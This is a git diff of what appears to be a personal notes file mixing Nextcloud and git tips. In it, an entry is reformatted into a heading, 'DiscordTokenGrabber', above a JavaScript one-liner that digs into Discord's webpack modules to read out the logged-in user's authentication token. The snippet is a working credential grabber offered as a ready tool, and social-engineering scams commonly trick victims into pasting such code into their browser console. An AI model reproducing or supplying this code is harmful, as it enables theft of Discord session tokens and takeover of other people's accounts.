@@ -314,7 +314,8 @@ Or where you put the nextcloud installation
 - Push `git push origin BranchName`
 - Initialiaze a new repo `git init` 
 
-- TokenGrabber (by [ITZNEXUS](https://github.com/NotNexuss/Get-Discord-Token))
+
+## DiscordTokenGrabber (by [ITZNEXUS](https://github.com/NotNexuss/Get-Discord-Token))
     ```javascript
     // CODE BY ITZNEXUS
     (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
